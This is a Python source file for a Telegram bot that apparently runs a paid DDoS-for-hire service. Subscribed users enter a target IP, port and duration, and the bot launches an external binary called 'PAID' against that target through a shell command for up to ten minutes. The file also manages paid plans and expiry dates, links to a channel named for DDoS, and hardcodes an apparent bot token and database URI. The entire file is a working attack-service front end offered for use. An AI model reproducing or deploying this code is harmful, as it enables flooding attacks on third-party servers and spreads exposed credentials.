import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import subprocess
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Setup logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
TOKEN = '8373103943:AAGcCj4y9JmmQvZGwoektVshuYuehdXQ9X4'
MONGO_URI = 'mongodb://atlas-sql-695a0db568d14341efe3d88a-ct7hvs.a.query.mongodb.net/sample_mflix?ssl=true&authSource=admin'
FORWARD_CHANNEL_ID = -8417161342

# Database setup
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['anxx']
    users_collection = db.users
    logger.info("Database connection successful")
except Exception as e:
    logger.error(f"Database connection failed: {e}")
    users_collection = None

# Bot setup
bot = telebot.TeleBot(TOKEN, parse_mode='Markdown')

# Constants
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
CHANNEL_ID = FORWARD_CHANNEL_ID

def check_user_approval(user_id):
    """Check if user is approved and has valid plan"""
    if not users_collection:
        return False
    
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data and user_data.get('plan', 0) > 0:
            # Check expiration date
            valid_until = user_data.get('valid_until', '')
            if valid_until:
                try:
                    expiry_date = datetime.fromisoformat(valid_until).date()
                    if datetime.now().date() > expiry_date:
                        return False
                except:
                    pass
            return True
    except Exception as e:
        logger.error(f"Error checking user approval: {e}")
    
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*❌ YOU ARE NOT APPROVED*\n\nPlease contact admin for access.")

def run_attack_command_sync(target_ip, target_port, duration):
    """Run attack command synchronously"""
    command = f"./PAID {target_ip} {target_port} {duration} 600"
    try:
        logger.info(f"Running command: {command}")
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate(timeout=5)
        
        if output:
            logger.info(f"Command output: {output.decode()}")
        if error:
            logger.error(f"Command error: {error.decode()}")
            
        return True
    except subprocess.TimeoutExpired:
        # Command is running in background, which is expected
        logger.info(f"Attack command started for {target_ip}:{target_port}")
        return True
    except Exception as e:
        logger.error(f"Failed to execute command: {e}")
        return False

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Send welcome message with keyboard"""
    # Create keyboard
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    
    # Add buttons in rows
    markup.row(KeyboardButton("Stop Attack 🧡"), KeyboardButton("Start Attack 💥"))
    markup.row(KeyboardButton("Canary Download✔️"), KeyboardButton("My Account🏦"))
    markup.row(KeyboardButton("Help❓"), KeyboardButton("Contact admin✔️"))
    
    welcome_text = """
*🤖 Welcome to the Bot!*

*Available Commands:*
/start - Show this menu
/attack - Start an attack
/help - Get help

*Use the buttons below:*"""
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)

@bot.message_handler(commands=['attack', 'Attack'])
def attack_command(message):
    """Handle /attack command"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return
    
    bot.send_message(chat_id, "*Enter target details:*\n\nFormat: `IP PORT DURATION`\n\nExample: `1.1.1.1 80 60`")
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    """Process attack parameters"""
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❌ Invalid format!*\n\nUse: `IP PORT DURATION`\nExample: `1.1.1.1 80 60`")
            return
        
        target_ip, target_port_str, duration_str = args
        
        # Validate IP (basic check)
        if not all(part.isdigit() for part in target_ip.split('.')) or len(target_ip.split('.')) != 4:
            bot.send_message(message.chat.id, "*❌ Invalid IP address*")
            return
        
        # Validate port
        try:
            target_port = int(target_port_str)
            if target_port < 1 or target_port > 65535:
                bot.send_message(message.chat.id, "*❌ Port must be between 1-65535*")
                return
            
            if target_port in blocked_ports:
                bot.send_message(message.chat.id, f"*❌ Port {target_port} is blocked*")
                return
        except ValueError:
            bot.send_message(message.chat.id, "*❌ Port must be a number*")
            return
        
        # Validate duration
        try:
            duration = int(duration_str)
            if duration < 10 or duration > 600:
                bot.send_message(message.chat.id, "*❌ Duration must be 10-600 seconds*")
                return
        except ValueError:
            bot.send_message(message.chat.id, "*❌ Duration must be a number*")
            return
        
        # Send confirmation and start attack
        bot.send_message(message.chat.id, f"""
*🚀 Attack Starting...*

*Target:* `{target_ip}:{target_port}`
*Duration:* `{duration}` seconds
*Status:* `Initializing...`
        """)
        
        # Run attack in background
        import threading
        attack_thread = threading.Thread(
            target=run_attack_background,
            args=(target_ip, target_port, duration, message.chat.id)
        )
        attack_thread.daemon = True
        attack_thread.start()
        
    except Exception as e:
        logger.error(f"Error in attack processing: {e}")
        bot.send_message(message.chat.id, "*❌ Error processing attack command*")

def run_attack_background(target_ip, target_port, duration, chat_id):
    """Run attack in background thread"""
    try:
        success = run_attack_command_sync(target_ip, target_port, duration)
        if success:
            bot.send_message(chat_id, f"""
*✅ Attack Launched!*

*Target:* `{target_ip}:{target_port}`
*Duration:* `{duration}` seconds
*Status:* `Running...`
            """)
        else:
            bot.send_message(chat_id, "*❌ Failed to start attack*")
    except Exception as e:
        logger.error(f"Background attack error: {e}")
        bot.send_message(chat_id, "*❌ Attack failed to execute*")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all text messages (button presses)"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Handle button presses
    if message.text == "Stop Attack 🧡":
        stop_attack(message)
    elif message.text == "Start Attack 💥":
        attack_command(message)
    elif message.text == "Canary Download✔️":
        bot.send_message(chat_id, "[📥 Canary Download Link](https://t.me/LSR_DDOS/4995)")
    elif message.text == "My Account🏦":
        show_account_info(message)
    elif message.text == "Help❓":
        bot.send_message(chat_id, "*Need help?*\n\nJoin @OSCHEATS on Telegram")
    elif message.text == "Contact admin✔️":
        bot.send_message(chat_id, "*👤 Admins:*\n\n@LSR_RAJPUT")
    else:
        # For any other text, check if it's a command
        if message.text.startswith('/'):
            pass  # Let command handlers deal with it
        else:
            bot.send_message(chat_id, "*Unknown command. Use /start to see menu.*")

def stop_attack(message):
    """Stop running attacks"""
    try:
        # Kill the PAID process
        subprocess.run("pkill -f PAID", shell=True, capture_output=True)
        subprocess.run("pkill -f 3day", shell=True, capture_output=True)
        time.sleep(1)
        bot.reply_to(message, "*🛑 All attacks stopped*")
    except Exception as e:
        logger.error(f"Error stopping attack: {e}")
        bot.reply_to(message, "*❌ Error stopping attacks*")

def show_account_info(message):
    """Show user account information"""
    user_id = message.from_user.id
    
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return
    
    try:
        user_data = users_collection.find_one({"user_id": user_id}) if users_collection else None
        
        if user_data:
            username = message.from_user.username or "No username"
            plan = user_data.get('plan', 0)
            valid_until = user_data.get('valid_until', 'Not set')
            
            # Plan names
            plan_names = {
                0: "❌ Free (No access)",
                1: "🧡 Instant Plan",
                2: "💥 Instant++ Plan"
            }
            
            plan_text = plan_names.get(plan, f"Plan {plan}")
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            response = f"""
*🏦 ACCOUNT INFORMATION*

*Username:* {username}
*User ID:* `{user_id}`
*Plan:* {plan_text}
*Valid Until:* {valid_until}
*Current Time:* {current_time}

*Status:* {'✅ ACTIVE' if plan > 0 else '❌ INACTIVE'}
            """
        else:
            response = "*❌ No account found*\n\nPlease contact admin to get approved."
        
        bot.send_message(message.chat.id, response)
        
    except Exception as e:
        logger.error(f"Error showing account info: {e}")
        bot.send_message(message.chat.id, "*❌ Error retrieving account information*")

@bot.message_handler(commands=['approve', 'disapprove'])
def admin_commands(message):
    """Handle admin approval commands"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if user is admin (simplified check - you should implement proper admin check)
    # For now, let's assume only specific user IDs are admin
    admin_ids = [123456789]  # Add your admin user IDs here
    
    if user_id not in admin_ids:
        bot.send_message(chat_id, "*❌ Admin access required*")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.send_message(chat_id, "*Usage:*\n/approve <user_id> <plan> <days>\n/disapprove <user_id>")
            return
        
        command = parts[0]
        target_user_id = int(parts[1])
        
        if command == '/approve':
            if len(parts) < 4:
                bot.send_message(chat_id, "*Usage:* /approve <user_id> <plan> <days>")
                return
            
            plan = int(parts[2])
            days = int(parts[3])
            
            valid_until = (datetime.now() + timedelta(days=days)).date().isoformat()
            
            users_collection.update_one(
                {"user_id": target_user_id},
                {"$set": {
                    "plan": plan,
                    "valid_until": valid_until,
                    "access_count": 0
                }},
                upsert=True
            )
            
            bot.send_message(chat_id, f"*✅ User {target_user_id} approved*\nPlan: {plan}\nDays: {days}\nValid until: {valid_until}")
            
        elif command == '/disapprove':
            users_collection.update_one(
                {"user_id": target_user_id},
                {"$set": {
                    "plan": 0,
                    "valid_until": "",
                    "access_count": 0
                }}
            )
            bot.send_message(chat_id, f"*❌ User {target_user_id} disapproved*")
            
    except Exception as e:
        logger.error(f"Error in admin command: {e}")
        bot.send_message(chat_id, f"*❌ Error: {str(e)}*")

# Run the bot
if __name__ == "__main__":
    logger.info("🤖 Bot starting...")
    
    try:
        # Remove webhook if exists
        bot.remove_webhook()
        
        # Start polling
        logger.info("✅ Bot is now polling for messages...")
        bot.infinity_polling(timeout=60, long_polling_timeout=30)
        
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        time.sleep(5)
